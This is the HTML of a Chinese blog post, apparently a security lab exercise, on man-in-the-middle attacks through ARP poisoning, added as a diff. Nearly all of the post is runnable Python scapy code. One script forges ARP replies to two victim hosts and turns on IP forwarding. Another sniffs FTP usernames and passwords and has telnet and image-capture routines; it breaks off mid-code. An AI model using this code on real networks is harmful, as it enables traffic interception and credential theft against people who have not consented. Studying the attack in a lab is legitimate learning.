@@ -1,0 +1,1597 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-flash.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+  <link href="//cdn.jsdelivr.net/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+  
+
+<link href="//maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/icon128.ico?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/icon32.ico?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/icon16.ico?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="scapy," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="实验目的">
+<meta property="og:type" content="article">
+<meta property="og:title" content="MITM攻击之ARP毒化">
+<meta property="og:url" content="https://asymptotic-freedom.xyz/posts/4026efe8/index.html">
+<meta property="og:site_name" content="风屿の博客">
+<meta property="og:description" content="实验目的">
+<meta property="og:image" content="https://asymptotic-freedom.xyz/images/loading.gif">
+<meta property="og:image" content="https://asymptotic-freedom.xyz/images/loading.gif">
+<meta property="og:image" content="https://asymptotic-freedom.xyz/images/loading.gif">
+<meta property="og:image" content="https://asymptotic-freedom.xyz/images/loading.gif">
+<meta property="og:image" content="https://asymptotic-freedom.xyz/images/loading.gif">
+<meta property="og:image" content="https://asymptotic-freedom.xyz/images/loading.gif">
+<meta property="og:image" content="https://asymptotic-freedom.xyz/images/loading.gif">
+<meta property="og:image" content="https://asymptotic-freedom.xyz/images/loading.gif">
+<meta property="og:image" content="https://asymptotic-freedom.xyz/images/loading.gif">
+<meta property="og:image" content="https://asymptotic-freedom.xyz/images/loading.gif">
+<meta property="og:image" content="https://asymptotic-freedom.xyz/images/loading.gif">
+<meta property="og:image" content="https://asymptotic-freedom.xyz/images/loading.gif">
+<meta property="og:image" content="https://asymptotic-freedom.xyz/images/loading.gif">
+<meta property="og:image" content="https://asymptotic-freedom.xyz/images/loading.gif">
+<meta property="og:image" content="https://asymptotic-freedom.xyz/images/loading.gif">
+<meta property="og:image" content="https://asymptotic-freedom.xyz/images/loading.gif">
+<meta property="og:image" content="https://asymptotic-freedom.xyz/images/loading.gif">
+<meta property="og:image" content="https://asymptotic-freedom.xyz/images/loading.gif">
+<meta property="og:image" content="https://asymptotic-freedom.xyz/images/loading.gif">
+<meta property="og:image" content="https://asymptotic-freedom.xyz/images/loading.gif">
+<meta property="og:image" content="https://asymptotic-freedom.xyz/images/loading.gif">
+<meta property="og:image" content="https://asymptotic-freedom.xyz/images/loading.gif">
+<meta property="og:image" content="https://asymptotic-freedom.xyz/images/loading.gif">
+<meta property="og:image" content="https://asymptotic-freedom.xyz/images/loading.gif">
+<meta property="og:image" content="https://asymptotic-freedom.xyz/images/loading.gif">
+<meta property="og:image" content="https://asymptotic-freedom.xyz/images/loading.gif">
+<meta property="og:image" content="https://asymptotic-freedom.xyz/images/loading.gif">
+<meta property="og:image" content="https://asymptotic-freedom.xyz/images/loading.gif">
+<meta property="og:image" content="https://asymptotic-freedom.xyz/images/loading.gif">
+<meta property="og:image" content="https://asymptotic-freedom.xyz/images/loading.gif">
+<meta property="article:published_time" content="2020-03-28T15:40:33.000Z">
+<meta property="article:modified_time" content="2022-04-09T15:16:20.986Z">
+<meta property="article:author" content="Asymptotic-freedom">
+<meta property="article:tag" content="scapy">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://asymptotic-freedom.xyz/images/loading.gif">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"flipYIn","post_header":"perspectiveRightIn","post_body":"perspectiveLeftIn","coll_header":"perspectiveDownIn","sidebar":"perspectiveUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://asymptotic-freedom.xyz/posts/4026efe8/"/>
+
+
+
+
+
+  <title>MITM攻击之ARP毒化 | 风屿の博客</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="风屿の博客" type="application/atom+xml"><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+	<a href="https://github.com/Aurthoria" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#70B7FD; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">风屿の博客</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://asymptotic-freedom.xyz/posts/4026efe8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Asymptotic-freedom">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="风屿の博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">MITM攻击之ARP毒化</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-28T23:40:33+08:00">
+                2020-03-28
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index">
+                    <span itemprop="name">信息安全学习</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                  <span class="post-meta-divider">|</span>
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  2k
+                </span>
+              
+
+              
+
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="实验目的"><a class="markdownIt-Anchor" href="#实验目的"></a> 实验目的</h1>
+<blockquote>
+<p><img src="/images/loading.gif" data-original="/posts/4026efe8/image-20200325211150567.png" alt="image-20200325211150567" style="zoom: 50%;"><a id="more"></a></p>
+</blockquote>
+<h1 id="实验过程"><a class="markdownIt-Anchor" href="#实验过程"></a> 实验过程</h1>
+<p>运行python代码，演示MITM攻击现象</p>
+<h2 id="python代码"><a class="markdownIt-Anchor" href="#python代码"></a> python代码</h2>
+<p>代码由两部分组成，一个是ArpPoison.py模块文件，便于调用和自定义攻击对象。另一个一个是newMitM.py对象文件。</p>
+<h3 id="arppoisonpy"><a class="markdownIt-Anchor" href="#arppoisonpy"></a> <a href="http://ArpPoison.py">ArpPoison.py</a></h3>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">__author__ = <span class="string">'Asymptotic_freedom'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ArpPoison</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    这是一个实现ARP毒化的类</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, interface, victimIP1, victimIP2, interval=<span class="number">1.5</span>)</span>:</span></span><br><span class="line">        self.__interface = interface  <span class="comment"># 网络接口</span></span><br><span class="line">        self.__victimIP1 = victimIP1  <span class="comment">#靶机IP1</span></span><br><span class="line">        self.__victimIP2 = victimIP2  <span class="comment">#靶机IP2</span></span><br><span class="line">        self.__interval = interval  <span class="comment">#ARP包发送间隔</span></span><br><span class="line">        self.__victimMAC1 = <span class="string">"ff:ff:ff:ff:ff:ff"</span></span><br><span class="line">        self.__victimMAC2 = <span class="string">"ff:ff:ff:ff:ff:ff"</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getMAC</span><span class="params">(interface, IP)</span>:</span></span><br><span class="line">        <span class="string">'''</span></span><br><span class="line"><span class="string">        srp(发送+接收2层报文),返回结果是两个元组。</span></span><br><span class="line"><span class="string">        ARP.op  取值为1或者2，代表ARP请求或者响应包,默认为1。</span></span><br><span class="line"><span class="string">        向外广播ARP请求IP地址对应的MAC，超时等待为2s，</span></span><br><span class="line"><span class="string">        接口为self.__interface,时间间隔为0.1s。</span></span><br><span class="line"><span class="string">        '''</span></span><br><span class="line">        conf.verb = <span class="number">0</span>  <span class="comment">#关闭输出</span></span><br><span class="line">        ans, unans = srp(Ether(dst=<span class="string">"ff:ff:ff:ff:ff:ff"</span>) / ARP(pdst=IP),</span><br><span class="line">                         timeout=<span class="number">2</span>,</span><br><span class="line">                         iface=interface,</span><br><span class="line">                         inter=<span class="number">0.1</span>)</span><br><span class="line">        <span class="keyword">for</span> snd, rcv <span class="keyword">in</span> ans:</span><br><span class="line">            <span class="keyword">return</span> rcv.sprintf(<span class="string">r"%Ether.src%"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__spoof</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">'''</span></span><br><span class="line"><span class="string">        进行ARP欺骗，对两个靶机分别发送伪造arp报文</span></span><br><span class="line"><span class="string">        MAC地址重定向为该主机</span></span><br><span class="line"><span class="string">        '''</span></span><br><span class="line">        send(</span><br><span class="line">            ARP(op=<span class="number">2</span>,</span><br><span class="line">                pdst=self.__victimIP1,</span><br><span class="line">                psrc=self.__victimIP2,</span><br><span class="line">                hwdst=self.__victimMAC1))</span><br><span class="line">        send(</span><br><span class="line">            ARP(op=<span class="number">2</span>,</span><br><span class="line">                pdst=self.__victimIP2,</span><br><span class="line">                psrc=self.__victimIP1,</span><br><span class="line">                hwdst=self.__victimMAC2))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__resARP</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">'''</span></span><br><span class="line"><span class="string">        为了避免停止arp毒化后暴露本机MAC地址</span></span><br><span class="line"><span class="string">        恢复两个靶机的ARP表</span></span><br><span class="line"><span class="string">        '''</span></span><br><span class="line">        print(<span class="string">"\n[*] 恢复对象机网络状态..."</span>)</span><br><span class="line">        self.__victimMAC1 = self.getMAC(self.__interface, self.__victimIP1)</span><br><span class="line">        self.__victimMAC2 = self.getMAC(self.__interface, self.__victimIP2)</span><br><span class="line">        send(ARP(op=<span class="number">2</span>,</span><br><span class="line">                 pdst=self.__victimIP2,</span><br><span class="line">                 psrc=self.__victimIP1,</span><br><span class="line">                 hwdst=<span class="string">"ff:ff:ff:ff:ff:ff"</span>,</span><br><span class="line">                 hwsrc=self.__victimMAC1),</span><br><span class="line">             count=<span class="number">8</span>)</span><br><span class="line">        send(ARP(op=<span class="number">2</span>,</span><br><span class="line">                 pdst=self.__victimIP1,</span><br><span class="line">                 psrc=self.__victimIP2,</span><br><span class="line">                 hwdst=<span class="string">"ff:ff:ff:ff:ff:ff"</span>,</span><br><span class="line">                 hwsrc=self.__victimMAC2),</span><br><span class="line">             count=<span class="number">8</span>)</span><br><span class="line">        print(<span class="string">"[*] 禁用该主机进行IP转发..."</span>)</span><br><span class="line">        os.system(<span class="string">"sudo echo 0 &gt; /proc/sys/net/ipv4/ip_forward"</span>)</span><br><span class="line">        print(<span class="string">"\n[*] Exiting..."</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">start</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">'''启动arp毒化进程'''</span></span><br><span class="line">        print(<span class="string">"\n[*] 允许该主机进行IP包转发..."</span>)</span><br><span class="line">        <span class="comment">#sudo sysctl net.ipv4.ip_forward=1</span></span><br><span class="line">        os.system(<span class="string">"sudo echo 1 &gt; /proc/sys/net/ipv4/ip_forward"</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            self.__victimMAC1 = self.getMAC(self.__interface, self.__victimIP1)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            os.system(<span class="string">"sudo echo 0 &gt; /proc/sys/net/ipv4/ip_forward"</span>)</span><br><span class="line">            print(<span class="string">"\n[!] 找不到%s的地址"</span>%(self.__victimIP1))</span><br><span class="line">            print(<span class="string">"[!] Exiting..."</span>)</span><br><span class="line">            sys.exit(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            self.__victimMAC2 = self.getMAC(self.__interface, self.__victimIP2)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="comment">#sudo sysctl net.ipv4.ip_forward=0</span></span><br><span class="line">            os.system(<span class="string">"sudo echo 0 &gt; /proc/sys/net/ipv4/ip_forward"</span>)</span><br><span class="line">            print(<span class="string">"\n[!] 找不到%s的地址"</span>%(self.__victimIP2))</span><br><span class="line">            print(<span class="string">"[!] Exiting..."</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                self.__spoof()</span><br><span class="line">                time.sleep(self.__interval)</span><br><span class="line">            <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">                self.__resARP()</span><br><span class="line">                <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div>
+<h3 id="newmitmpy"><a class="markdownIt-Anchor" href="#newmitmpy"></a> <a href="http://newMitM.py">newMitM.py</a></h3>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> arpPoison <span class="keyword">import</span> ArpPoison</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"><span class="keyword">import</span> netifaces</span><br><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">__author__ = <span class="string">'Asymptotic_freedom'</span></span><br><span class="line"></span><br><span class="line">clientIP = <span class="literal">None</span></span><br><span class="line">serverIP = <span class="literal">None</span></span><br><span class="line">isCnted = <span class="literal">False</span></span><br><span class="line">clientMAC = <span class="literal">None</span></span><br><span class="line">serverMAC = <span class="literal">None</span></span><br><span class="line">localMAC = <span class="literal">None</span></span><br><span class="line">re_jpg = <span class="string">b'\xff\xd8\xff[\s\S]*\xff\xd9'</span></span><br><span class="line">re_png = <span class="string">b'\x89\x50\x4e\x47[\s\S]*\xae\x42\x60\x82'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sniff(filter=<span class="string">'tcp port 21'</span>, prn=ftpSniff)</span><br><span class="line">        <span class="comment">#sniff(filter='tcp port 23',prn=telnetSniff)</span></span><br><span class="line">        <span class="comment">#os.system("sudo sysctl net.ipv4.ip_forward=0")</span></span><br><span class="line">        <span class="comment">#sniff(filter='tcp port 23',prn=telnetReplace)</span></span><br><span class="line">        <span class="comment">#sniff(filter='tcp', prn=imageSniff)</span></span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ftpSniff</span><span class="params">(pkt)</span>:</span></span><br><span class="line">    <span class="string">'''嗅探FTP用户密码'''</span></span><br><span class="line">    dest = pkt[IP].dst</span><br><span class="line">    raw = str(pkt[TCP].payload)</span><br><span class="line">    user = re.findall(<span class="string">'(?i)USER (.*)'</span>, raw)</span><br><span class="line">    pswd = re.findall(<span class="string">'(?i)PASS (.*)'</span>, raw)</span><br><span class="line">    <span class="keyword">if</span> user:</span><br><span class="line">        print(<span class="string">'[*] Detected FTP Login to '</span> + str(dest))</span><br><span class="line">        print(<span class="string">'[+] User account: '</span> + str(user[<span class="number">0</span>]))</span><br><span class="line">    <span class="keyword">elif</span> pswd:</span><br><span class="line">        print(<span class="string">'[+] Password: '</span> + str(pswd[<span class="number">0</span>]))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">telnetSniff</span><span class="params">(pkt)</span>:</span></span><br><span class="line">    <span class="string">'''嗅探telnet密码(主要是显示对话信息)'''</span></span><br><span class="line">    <span class="keyword">global</span> isCnted</span><br><span class="line">    src = pkt[IP].src</span><br><span class="line">    raw = str(pkt[TCP].payload)</span><br><span class="line">    <span 